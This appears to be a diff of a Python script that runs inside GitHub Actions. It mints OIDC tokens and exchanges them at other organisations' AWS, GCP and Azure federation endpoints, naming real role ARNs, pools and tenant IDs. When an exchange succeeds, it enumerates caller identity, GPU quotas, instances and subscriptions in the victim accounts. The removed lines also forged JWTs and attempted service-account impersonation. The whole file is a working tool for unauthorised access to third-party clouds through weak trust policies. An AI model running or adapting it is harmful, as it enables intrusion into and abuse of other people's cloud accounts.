@@ -1,27 +1,22 @@
 #!/usr/bin/env python3
-"""Intent 113476: GitHub-OIDC federation test of the 3 untested leads + controls.
+"""Intent 147714: exactly one federation candidate per provider, read-only validation.
 
-Leads (deduped against the 7 task-545 trust-tested GATEs, facts 113382/113403):
-  AWS arn:aws:iam::786169356362:role/odin/kumo-external-access-role   (NVIDIA kumo-engine)
-  AWS arn:aws:iam::678256850452:role/ocp-sts-role                     (IBM cloud-pak-deployer)
-  GCP projects/328033609117/locations/global/workloadIdentityPools/
-      multi-storage-client-beta/providers/multi-storage-client-beta   (NVIDIA multi-storage-client)
+AWS   : arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role   (prior lane's positive control)
+GCP   : projects/531508670106/locations/global/workloadIdentityPools/github-identity-pool/providers/github-id-provider
+Azure : client 04c6b4e0-2144-48aa-869c-9d0892d11277 / tenant b29a1c6d-3698-4e5d-b3c6-3a7e2976bf69
+        (pthoor/arrow-demo2-deploy, the only hard-coded Entra OIDC triple in the probed repos)
 
-Controls:
-  * positive AWS role / GCP provider known to accept pool repo tokens (prior facts)
-  * bogus role ARN / bogus provider
-  * tampered (last-char corrupted) GitHub OIDC JWT
-  * self-signed bogus JWT (alg RS256, random key)
-  * different-subject run (separate branch) and different-audience mint
-
-Runs inside picxbed/ci-utils GitHub Actions (workflow_dispatch / push).
+Mints GitHub OIDC tokens from this vehicle repo and performs the federated exchange at each
+provider. Only read-only follow-up calls are made; access tokens are never printed.
 """
-import json, os, sys, base64, hmac, hashlib, datetime, urllib.request, urllib.error, urllib.parse
+import json, os, base64, hashlib, hmac, datetime, urllib.request, urllib.error, urllib.parse
 
-TAG = 'c211-i113476'
+TAG = 'i147714'
+
 
 def out(tag, obj):
-    print('RESULT %s %s' % (tag, json.dumps(obj, sort_keys=True, default=str)), flush=True)
+    print('I147714 %s %s' % (tag, json.dumps(obj, default=str)[:1600]), flush=True)
+
 
 def mint(aud):
     u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
@@ -32,35 +27,20 @@ def mint(aud):
     req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + t})
     return json.loads(urllib.request.urlopen(req, timeout=30).read())['value']
 
+
 def claims(tok):
-    p = tok.split('.')[1]; p += '=' * (-len(p) % 4)
+    p = tok.split('.')[1]
+    p += '=' * (-len(p) % 4)
     d = json.loads(base64.urlsafe_b64decode(p))
-    return {k: d.get(k) for k in ('iss', 'sub', 'aud', 'repository', 'repository_id', 'ref',
-                                  'event_name', 'environment', 'workflow_ref', 'job_workflow_ref')}
+    return {k: d.get(k) for k in ('iss', 'sub', 'aud', 'repository', 'ref', 'event_name',
+                                  'environment', 'job_workflow_ref')}
 
-def corrupt(tok):
-    last = tok[-1]
-    return tok[:-1] + ('A' if last != 'A' else 'B')
-
-def b64u(b):
-    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
-
-def bogus_jwt():
-    """Self-signed JWT with GitHub-shaped claims but a random RSA key."""
-    header = {'alg': 'RS256', 'typ': 'JWT', 'kid': 'c211-i113476-bogus'}
-    now = int(datetime.datetime.utcnow().timestamp())
-    payload = {'iss': 'https://token.actions.githubusercontent.com',
-               'sub': 'repo:picxbed/ci-utils:ref:refs/heads/c211-i113476',
-               'aud': 'sts.amazonaws.com', 'repository': 'picxbed/ci-utils',
-               'iat': now, 'nbf': now, 'exp': now + 600}
-    signing_input = b64u(json.dumps(header).encode()) + '.' + b64u(json.dumps(payload).encode())
-    fake_sig = b64u(hashlib.sha256(os.urandom(32) + signing_input.encode()).digest())
-    return signing_input + '.' + fake_sig
 
 def http(method, url, data=None, headers=None, timeout=60):
     h = dict(headers or {})
-    if isinstance(data, str):
-        data = data.encode()
+    if isinstance(data, dict):
+        data = urllib.parse.urlencode(data).encode()
+        h.setdefault('Content-Type', 'application/x-www-form-urlencoded')
     req = urllib.request.Request(url, data=data, method=method, headers=h)
     try:
         r = urllib.request.urlopen(req, timeout=timeout)
@@ -70,36 +50,16 @@ def http(method, url, data=None, headers=None, timeout=60):
     except Exception as e:
         return -1, str(e)[:300]
 
-def xml_fields(txt):
-    import xml.etree.ElementTree as ET
-    try:
-        root = ET.fromstring(txt)
-    except Exception:
-        return {'raw': txt[:300]}
-    res = {}
-    for el in root.iter():
-        name = el.tag.split('}')[-1]
-        if name in ('AccessKeyId', 'SecretAccessKey', 'SessionToken', 'Expiration', 'Code',
-                    'Message', 'RoleArn', 'AssumedRoleId', 'Account', 'Arn', 'UserId'):
-            res[name] = el.text
-    return res
-
-def aws_assume(role, tok, tag=''):
-    body = urllib.parse.urlencode({'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
-                                   'RoleArn': role, 'RoleSessionName': TAG,
-                                   'WebIdentityToken': tok, 'DurationSeconds': '3600'}).encode()
-    st, txt = http('POST', 'https://sts.amazonaws.com/', body,
-                   {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': TAG})
-    f = xml_fields(txt)
-    return st, f, txt
 
 def _sign(key, msg):
     return hmac.new(key, msg.encode(), hashlib.sha256).digest()
 
+
 def sigv4(method, host, path, region, service, ak, sk, stk, body='',
           ctype='application/x-www-form-urlencoded', extra=None):
     t = datetime.datetime.utcnow()
-    amzdate = t.strftime('%Y%m%dT%H%M%SZ'); datestamp = t.strftime('%Y%m%d')
+    amzdate = t.strftime('%Y%m%dT%H%M%SZ')
+    datestamp = t.strftime('%Y%m%d')
     headers = {'host': host, 'x-amz-date': amzdate, 'x-amz-security-token': stk}
     if body:
         headers['content-type'] = ctype
@@ -122,200 +82,151 @@ def sigv4(method, host, path, region, service, ak, sk, stk, body='',
     return {'Authorization': auth, 'X-Amz-Date': amzdate, 'X-Amz-Security-Token': stk,
             'Content-Type': ctype, 'Host': host}
 
+
 def aws_api(creds, region, service, body, target=None, ctype='application/x-amz-json-1.1'):
     ak, sk, stk = creds['AccessKeyId'], creds['SecretAccessKey'], creds['SessionToken']
     if service == 'sts':
-        host = 'sts.amazonaws.com'; path = '/'
-    elif service == 'ec2':
-        host = 'ec2.%s.amazonaws.com' % region; path = '/'
-    elif service == 'sagemaker':
-        host = 'api.sagemaker.%s.amazonaws.com' % region; path = '/'
-    elif service == 'servicequotas':
-        host = 'servicequotas.%s.amazonaws.com' % region; path = '/'
-    elif service == 'eks':
-        host = 'eks.%s.amazonaws.com' % region; path = '/'
+        host, path = 'sts.amazonaws.com', '/'
     else:
-        host = '%s.%s.amazonaws.com' % (service, region); path = '/'
-    extra = {}
-    if target:
-        extra['x-amz-target'] = target
-    hdrs = sigv4('POST', host, path, region, service, ak, sk, stk,
-                 body=body, ctype=ctype, extra=extra)
-    st, txt = http('POST', 'https://' + host + path, body, hdrs)
-    return st, txt
+        host, path = '%s.%s.amazonaws.com' % (service, region), '/'
+    extra = {'x-amz-target': target} if target else None
+    hdrs = sigv4('POST', host, path, region, service, ak, sk, stk, body=body, ctype=ctype, extra=extra)
+    return http('POST', 'https://' + host + path, body, hdrs)
 
-def trim(txt, n=900):
-    return txt[:n] if isinstance(txt, str) else txt
 
-REGIONS = ['us-east-1', 'us-west-2', 'us-east-2', 'eu-west-1', 'ap-northeast-1', 'ap-south-1']
-
-def enumerate_aws(creds, tag):
+def xml_fields(txt):
+    import xml.etree.ElementTree as ET
     try:
-        st, txt = aws_api(creds, 'us-east-1', 'sts', 'Action=GetCallerIdentity&Version=2011-06-15')
-        out(tag + '-CALLER', {'status': st, 'body': trim(txt, 500)})
-    except Exception as e:
-        out(tag + '-CALLER', {'error': str(e)[:200]})
-    for region in REGIONS:
-        try:
-            st, txt = aws_api(creds, region, 'servicequotas',
-                              json.dumps({'ServiceCode': 'sagemaker', 'MaxResults': 100}),
-                              target='ServiceQuotasV20190624.ListServiceQuotas')
-            vals = []
-            try:
-                for q in json.loads(txt).get('Quotas', []):
-                    nm = q.get('QuotaName') or ''
-                    if 'ml.' in nm or 'training job' in nm or 'endpoint' in nm:
-                        vals.append([nm, q.get('Value')])
-            except Exception:
-                pass
-            out(tag + '-SMQUOTA-' + region, {'status': st, 'gpu_quotas': vals[:40],
-                                             'body': trim(txt, 200) if st != 200 else ''})
-        except Exception as e:
-            out(tag + '-SMQUOTA-' + region, {'error': str(e)[:200]})
-    for region in ('us-east-1', 'us-west-2', 'us-east-2'):
-        for target, body in (('SageMaker.ListClusters', '{}'),
-                             ('SageMaker.ListEndpoints', '{}')):
-            try:
-                st, txt = aws_api(creds, region, 'sagemaker', body, target=target)
-                out('%s-%s-%s' % (tag, target.split('.')[-1], region),
-                    {'status': st, 'body': trim(txt, 700)})
-            except Exception as e:
-                out('%s-%s-%s' % (tag, target.split('.')[-1], region), {'error': str(e)[:200]})
-    for region in REGIONS:
-        try:
-            st, txt = aws_api(creds, region, 'ec2', 'Action=DescribeCapacityReservations&Version=2016-11-15')
-            out(tag + '-CAPRES-' + region, {'status': st, 'body': trim(txt, 600)})
-        except Exception as e:
-            out(tag + '-CAPRES-' + region, {'error': str(e)[:200]})
-    for region in REGIONS:
-        try:
-            st, txt = aws_api(creds, region, 'eks', '{}', target='EKS.ListClusters')
-            out(tag + '-EKSLIST-' + region, {'status': st, 'body': trim(txt, 500)})
-        except Exception as e:
-            out(tag + '-EKSLIST-' + region, {'error': str(e)[:200]})
+        root = ET.fromstring(txt)
+    except Exception:
+        return {}
+    res = {}
+    for el in root.iter():
+        name = el.tag.split('}')[-1]
+        if name in ('AccessKeyId', 'SecretAccessKey', 'SessionToken', 'Code', 'Message',
+                    'Arn', 'Account', 'UserId', 'RoleArn'):
+            res[name] = el.text
+    return res
 
-def gcp_sts(provider, tok):
-    aud = '//iam.googleapis.com/' + provider
-    data = urllib.parse.urlencode({
+
+def aws_probe():
+    role = 'arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role'
+    tok = mint('sts.amazonaws.com')
+    out('AWS-CLAIMS', claims(tok))
+    body = urllib.parse.urlencode({'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
+                                   'RoleArn': role, 'RoleSessionName': TAG,
+                                   'WebIdentityToken': tok, 'DurationSeconds': '3600'}).encode()
+    st, txt = http('POST', 'https://sts.amazonaws.com/', body,
+                   {'Content-Type': 'application/x-www-form-urlencoded'})
+    f = xml_fields(txt) if st == 200 else {}
+    out('AWS-ASSUME', {'http': st, 'role': role, 'code': f.get('Code'),
+                       'message': (f.get('Message') or '')[:300],
+                       'assumed': bool(f.get('AccessKeyId'))})
+    if not f.get('AccessKeyId'):
+        return
+    st, txt = aws_api(f, 'us-east-1', 'sts', 'Action=GetCallerIdentity&Version=2011-06-15')
+    out('AWS-G1-CALLER', {'http': st, 'body': txt[:500]})
+    st, txt = aws_api(f, 'us-east-1', 'servicequotas',
+                      json.dumps({'ServiceCode': 'sagemaker', 'MaxResults': 100}),
+                      target='ServiceQuotasV20190624.ListServiceQuotas')
+    vals = []
+    try:
+        for q in json.loads(txt).get('Quotas', []):
+            nm = q.get('QuotaName') or ''
+            if 'training job' in nm or 'endpoint' in nm or 'ml.' in nm:
+                vals.append([nm, q.get('Value')])
+    except Exception:
+        pass
+    out('AWS-G4-QUOTA', {'http': st, 'quotas': vals[:20], 'body': '' if st == 200 else txt[:200]})
+    st, txt = aws_api(f, 'us-east-1', 'ec2', 'Action=DescribeCapacityReservations&Version=2016-11-15')
+    out('AWS-G5-CAPRES', {'http': st, 'body': txt[:400]})
+    st, txt = aws_api(f, 'us-east-1', 'ec2', 'Action=DescribeInstances&Version=2016-11-15')
+    out('AWS-INSTANCES', {'http': st, 'body': txt[:400]})
+
+
+def gcp_probe():
+    prov = ('projects/531508670106/locations/global/workloadIdentityPools/'
+            'github-identity-pool/providers/github-id-provider')
+    tok = mint('//iam.googleapis.com/' + prov)
+    out('GCP-CLAIMS', claims(tok))
+    st, txt = http('POST', 'https://sts.googleapis.com/v1/token', {
         'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
-        'audience': aud,
+        'audience': '//iam.googleapis.com/' + prov,
         'scope': 'https://www.googleapis.com/auth/cloud-platform',
         'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
         'subject_token_type': 'urn:ietf:params:oauth:token-type:jwt',
-        'subject_token': tok}).encode()
-    return http('POST', 'https://sts.googleapis.com/v1/token', data,
-                {'Content-Type': 'application/x-www-form-urlencoded'})
+        'subject_token': tok})
+    out('GCP-G1-STS', {'http': st, 'body': txt[:700]})
+    if st != 200:
+        return
+    try:
+        at = json.loads(txt).get('access_token', '')
+    except Exception:
+        at = ''
+    if not at:
+        return
+    out('GCP-TOKEN', {'len': len(at), 'sha16': hashlib.sha256(at.encode()).hexdigest()[:16]})
+    for tag, url in (
+        ('GCP-PROJECT', 'https://cloudresourcemanager.googleapis.com/v1/projects/531508670106'),
+        ('GCP-INSTANCES', 'https://compute.googleapis.com/compute/v1/projects/531508670106/aggregated/instances?maxResults=20'),
+        ('GCP-SERVICES', 'https://serviceusage.googleapis.com/v1/projects/531508670106/services?filter=state:ENABLED&pageSize=10'),
+        ('GCP-QUOTAS', 'https://compute.googleapis.com/compute/v1/projects/531508670106/regions/us-central1/quotas'),
+    ):
+        st, txt = http('GET', url, headers={'Authorization': 'Bearer ' + at})
+        out(tag, {'http': st, 'body': txt[:600]})
 
-def gcp_get(at, url, tag):
-    st, txt = http('GET', url, headers={'Authorization': 'Bearer ' + at})
-    out(tag, {'status': st, 'body': trim(txt, 900)})
-    return st, txt
 
-def enumerate_gcp(at, project, tag):
-    gcp_get(at, 'https://cloudresourcemanager.googleapis.com/v1/projects/' + project, tag + '-PROJECT')
-    gcp_get(at, 'https://serviceusage.googleapis.com/v1/projects/%s/services?filter=state:ENABLED&pageSize=30' % project,
-            tag + '-SERVICES')
-    gcp_get(at, 'https://compute.googleapis.com/compute/v1/projects/%s/aggregated/instances?maxResults=50' % project,
-            tag + '-INSTANCES')
-    gcp_get(at, 'https://compute.googleapis.com/compute/v1/projects/%s/regions/us-central1/quotas' % project,
-            tag + '-QUOTAS')
-    gcp_get(at, 'https://aiplatform.googleapis.com/v1/projects/%s/locations?pageSize=20' % project,
-            tag + '-VERTEX-LOCS')
-    gcp_get(at, 'https://container.googleapis.com/v1/projects/%s/locations/-/clusters' % project,
-            tag + '-GKE')
-    # service-account impersonation candidates (bounded)
-    for sa in ('multi-storage-client-beta@%s.iam.gserviceaccount.com' % project,
-               'multi-storage-client@%s.iam.gserviceaccount.com' % project,
-               'github-actions@%s.iam.gserviceaccount.com' % project):
-        body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
-                           'lifetime': '900s'})
-        st, txt = http('POST',
-                       'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % sa,
-                       body, {'Content-Type': 'application/json',
-                              'Authorization': 'Bearer ' + at})
-        out(tag + '-IMPERSONATE-' + sa.split('@')[0], {'status': st, 'body': trim(txt, 400)})
-
-AWS_TARGETS = [
-    ('KUMO-ODIN', 'arn:aws:iam::786169356362:role/odin/kumo-external-access-role'),
-    ('IBM-OCP', 'arn:aws:iam::678256850452:role/ocp-sts-role'),
-]
-AWS_POS_CONTROL = ('POS-CONTROL', 'arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role')
-AWS_BAD_ROLE = 'arn:aws:iam::420032683002:role/c211-i113476-no-such-role'
-GCP_PROVIDER = ('projects/328033609117/locations/global/workloadIdentityPools/'
-                'multi-storage-client-beta/providers/multi-storage-client-beta')
-GCP_POS_CONTROL = ('projects/531508670106/locations/global/workloadIdentityPools/'
-                   'github-identity-pool/providers/github-id-provider')
-
-def main():
-    out('ENV', {'repo': os.environ.get('GITHUB_REPOSITORY'),
-                'ref': os.environ.get('GITHUB_REF'),
-                'sha': os.environ.get('GITHUB_SHA'),
-                'run_id': os.environ.get('GITHUB_RUN_ID'),
-                'event': os.environ.get('GITHUB_EVENT_NAME'),
-                'actor': os.environ.get('GITHUB_ACTOR')})
-    aws_tok = mint('sts.amazonaws.com')
-    out('AWS-CLAIMS', claims(aws_tok))
-    ok = {}
-    for name, role in AWS_TARGETS + [AWS_POS_CONTROL]:
-        st, f, raw = aws_assume(role, aws_tok)
-        out('AWS-ASSUME-' + name, {'status': st, 'code': f.get('Code'),
-                                   'message': (f.get('Message') or '')[:300],
-                                   'assumed': bool(f.get('AccessKeyId')), 'role': role})
-        if f.get('AccessKeyId'):
-            ok[name] = f
-    # controls
-    st, f, raw = aws_assume(AWS_TARGETS[0][1], corrupt(aws_tok))
-    out('AWS-CTL-TAMPERED', {'status': st, 'code': f.get('Code'),
-                             'message': (f.get('Message') or '')[:300],
-                             'assumed': bool(f.get('AccessKeyId'))})
-    st, f, raw = aws_assume(AWS_TARGETS[0][1], bogus_jwt())
-    out('AWS-CTL-BOGUSJWT', {'status': st, 'code': f.get('Code'),
-                             'message': (f.get('Message') or '')[:300],
-                             'assumed': bool(f.get('AccessKeyId'))})
-    st, f, raw = aws_assume(AWS_BAD_ROLE, aws_tok)
-    out('AWS-CTL-BADROLE', {'status': st, 'code': f.get('Code'),
-                            'message': (f.get('Message') or '')[:300],
-                            'assumed': bool(f.get('AccessKeyId'))})
-    # different-audience token (not mintable for sts.amazonaws.com by the trust)
-    waud = mint('https://c211-i113476.invalid')
-    out('AWS-WRONG-AUD-CLAIMS', claims(waud))
-    st, f, raw = aws_assume(AWS_TARGETS[0][1], waud)
-    out('AWS-CTL-WRONGAUD', {'status': st, 'code': f.get('Code'),
-                             'message': (f.get('Message') or '')[:300],
-                             'assumed': bool(f.get('AccessKeyId'))})
-    for name, f in ok.items():
-        enumerate_aws(f, 'AWS-' + name)
-    # GCP
-    gtok = mint('//iam.googleapis.com/' + GCP_PROVIDER)
-    out('GCP-CLAIMS', claims(gtok))
-    st, txt = gcp_sts(GCP_PROVIDER, gtok)
-    out('GCP-STS-TARGET', {'status': st, 'body': trim(txt, 700)})
+def azure_probe():
+    tenant = 'b29a1c6d-3698-4e5d-b3c6-3a7e2976bf69'
+    client = '04c6b4e0-2144-48aa-869c-9d0892d11277'
+    tok = mint('api://AzureADTokenExchange')
+    out('AZ-CLAIMS', claims(tok))
+    st, txt = http('POST', 'https://login.microsoftonline.com/%s/oauth2/v2.0/token' % tenant, {
+        'client_id': client,
+        'scope': 'https://management.azure.com/.default',
+        'grant_type': 'client_credentials',
+        'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+        'client_assertion': tok})
+    body = txt[:1200]
+    try:
+        j = json.loads(txt)
+        if j.get('access_token'):
+            body = 'ACCESS_TOKEN_PRESENT len=%d' % len(j['access_token'])
+    except Exception:
+        j = {}
+    out('AZ-G1-EXCHANGE', {'http': st, 'tenant': tenant, 'client': client, 'body': body})
+    at = j.get('access_token') if isinstance(j, dict) else None
+    if not at:
+        return
+    out('AZ-TOKEN', {'len': len(at), 'sha16': hashlib.sha256(at.encode()).hexdigest()[:16]})
+    st, txt = http('GET', 'https://management.azure.com/subscriptions?api-version=2022-12-01',
+                   headers={'Authorization': 'Bearer ' + at})
+    out('AZ-SUBSCRIPTIONS', {'http': st, 'body': txt[:1200]})
     if st == 200:
         try:
-            at = json.loads(txt).get('access_token', '')
-            enumerate_gcp(at, '328033609117', 'GCP-TARGET')
+            subs = json.loads(txt).get('value', [])
+        except Exception:
+            subs = []
+        for s in subs[:5]:
+            sid = s.get('subscriptionId')
+            out('AZ-SUB', {'id': sid, 'state': s.get('state')})
+            st2, txt2 = http('GET',
+                             'https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/usages?api-version=2023-07-01&location=eastus' % sid,
+                             headers={'Authorization': 'Bearer ' + at})
+            out('AZ-G4-USAGE', {'sub': sid, 'http': st2, 'body': txt2[:600]})
+
+
+def main():
+    out('ENV', {'repo': os.environ.get('GITHUB_REPOSITORY'), 'ref': os.environ.get('GITHUB_REF'),
+                'event': os.environ.get('GITHUB_EVENT_NAME'), 'run': os.environ.get('GITHUB_RUN_ID'),
+                'sha': os.environ.get('GITHUB_SHA')})
+    for name, fn in (('AWS', aws_probe), ('GCP', gcp_probe), ('AZURE', azure_probe)):
+        try:
+            fn()
         except Exception as e:
-            out('GCP-TARGET-ENUM', {'error': str(e)[:200]})
-    st, txt = gcp_sts(GCP_PROVIDER, corrupt(gtok))
-    out('GCP-CTL-TAMPERED', {'status': st, 'body': trim(txt, 400)})
-    st, txt = gcp_sts(GCP_PROVIDER, bogus_jwt())
-    out('GCP-CTL-BOGUSJWT', {'status': st, 'body': trim(txt, 400)})
-    bad_provider = GCP_PROVIDER[:-1] + ('x' if GCP_PROVIDER[-1] != 'x' else 'y')
-    btok = mint('//iam.googleapis.com/' + bad_provider)
-    st, txt = gcp_sts(bad_provider, btok)
-    out('GCP-CTL-BADPROVIDER', {'status': st, 'body': trim(txt, 400)})
-    wrong_aud = mint('//iam.googleapis.com/projects/328033609117')
-    out('GCP-WRONG-AUD-CLAIMS', claims(wrong_aud))
-    st, txt = gcp_sts(GCP_PROVIDER, wrong_aud)
-    out('GCP-CTL-WRONGAUD', {'status': st, 'body': trim(txt, 400)})
-    ptok = mint('//iam.googleapis.com/' + GCP_POS_CONTROL)
-    st, txt = gcp_sts(GCP_POS_CONTROL, ptok)
-    out('GCP-CTL-POSITIVE', {'status': st, 'body': trim(txt, 500)})
+            out(name + '-FATAL', {'error': str(e)[:400]})
     out('DONE', {'ok': True})
 
+
 if __name__ == '__main__':
-    try:
-        main()
-    except Exception as e:
-        out('FATAL', {'error': str(e)[:400]})
-        raise
+    main()
